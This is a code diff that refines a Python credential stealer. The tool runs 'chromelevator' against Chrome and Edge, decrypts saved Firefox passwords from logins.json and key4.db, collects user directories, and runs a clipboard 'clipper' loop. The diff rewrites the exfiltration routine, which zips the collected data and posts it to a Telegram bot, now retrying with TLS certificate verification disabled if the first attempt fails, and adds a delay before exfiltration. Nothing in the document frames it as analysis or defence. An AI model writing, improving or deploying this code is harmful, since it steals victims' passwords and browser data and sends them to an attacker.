@@ -16,7 +16,7 @@ import platform
 import psutil
 import GPUtil
 import locale
-
+import datetime
 import getpass
 import subprocess
 import win32clipboard
@@ -253,17 +253,20 @@ def run_chrome_elevator(browser_name):
 _elevator_ran = False
 def extr_browser():
     global _elevator_ran
-    if _elevator_ran: 
+    if _elevator_ran:
         return
     _elevator_ran = True
 
     os.makedirs(EXTRACT_FOLDER, exist_ok=True)
 
-    # 2a) Pre‐create every browser folder
-    for name in BROWSERS.keys():
-        os.makedirs(os.path.join(EXTRACT_FOLDER, name), exist_ok=True)
+    # 3a) only Chrome & Edge
+    os.makedirs(os.path.join(EXTRACT_FOLDER, "Chrome"), exist_ok=True)
+    os.makedirs(os.path.join(EXTRACT_FOLDER, "Edge"), exist_ok=True)
+    # catch-all for everything else
+    other_root = os.path.join(EXTRACT_FOLDER, "Other")
+    os.makedirs(other_root, exist_ok=True)
 
-    # run for both chrome & edge
+    # run only chrome & edge through chromelevator
     for short, keyname in (("chrome","Chrome"), ("edge","Edge")):
         # skip if browser data folder missing
         if not os.path.isdir(BROWSERS.get(keyname, "")):
@@ -271,7 +274,6 @@ def extr_browser():
 
         ok = run_chrome_elevator(short)
         if not ok:
-            # fallback error log
             with open(os.path.join(EXTRACT_FOLDER, f"{short}_elevator_error.txt"), "a") as f:
                 f.write(f"{time.ctime()}: chromelevator for {short} failed\n")
             continue
@@ -338,12 +340,14 @@ def extr_browser():
 def extr_firefox_passwords():
     ROAMING = os.getenv("APPDATA")
     firefox_profiles = os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles")
-    if not os.path.exists(firefox_profiles):
-        return
+    other_root = os.path.join(EXTRACT_FOLDER, "Other")
 
     for profile in os.listdir(firefox_profiles):
         prof_path = os.path.join(firefox_profiles, profile)
         if not os.path.isdir(prof_path): continue
+
+        dest = os.path.join(other_root, profile)
+        os.makedirs(dest, exist_ok=True)
 
         logins_path = os.path.join(prof_path, "logins.json")
         key_db_path = os.path.join(prof_path, "key4.db")
@@ -379,8 +383,9 @@ def extr_firefox_passwords():
             with open(logins_path, "r", encoding="utf-8", errors="ignore") as f:
                 logins = json.load(f).get("logins", [])
 
-            os.makedirs(EXTRACT_FOLDER, exist_ok=True)
-            with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as out:
+            # os.makedirs(EXTRACT_FOLDER, exist_ok=True)
+            out_file = os.path.join(dest, "passwords.txt")
+            with open(out_file, "w", encoding="utf-8", errors="ignore") as out:
                 for login in logins:
                     try:
                         url = login.get("hostname")
@@ -455,33 +460,52 @@ def clipper_loop():
 import datetime
 
 
-# === ZIP & TELEGRAM ===
-def send_zip_to_telegram():
-    try:
-        zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
-        zip_path = f"{zip_name}.zip"
+import requests
+from requests.exceptions import SSLError, RequestException
 
+def send_zip_to_telegram():
+    zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    zip_path = f"{zip_name}.zip"
+    try:
+        # build the zip
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for root, dirs, files in os.walk(EXTRACT_FOLDER):
                 for file in files:
                     if file == "system_service.exe":
-                        continue  # ❌ Skip the EXE
+                        continue
                     file_path = os.path.join(root, file)
                     arcname = os.path.relpath(file_path, EXTRACT_FOLDER)
                     zipf.write(file_path, arcname)
 
-        with open(zip_path, "rb") as f:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={"chat_id": CHAT_ID},
-                files={"document": (os.path.basename(zip_path), f)}
-            )
+        def _post(verify=True):
+            with open(zip_path, "rb") as f:
+                return requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                    data={"chat_id": CHAT_ID},
+                    files={"document": (os.path.basename(zip_path), f)},
+                    timeout=15,
+                    verify=verify
+                )
 
-        os.remove(zip_path)
+        # first try normally
+        try:
+            _post(verify=True)
+        except SSLError:
+            # retry once without cert verification
+            _post(verify=False)
 
+    except RequestException as e:
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as errlog:
+            errlog.write(f"Telegram request failed: {e}\n")
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8", errors="ignore") as errlog:
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as errlog:
             errlog.write(str(e))
+    finally:
+        try:
+            os.remove(zip_path)
+        except:
+            pass
+
 
 
 import psutil
@@ -786,6 +810,7 @@ def run():
                 extr_browser()
                 extr_firefox_passwords()
                 grab_user_dirs() 
+                time.sleep(1)
                 send_zip_to_telegram()
                 mark_exfiltrated()
         except Exception as e:
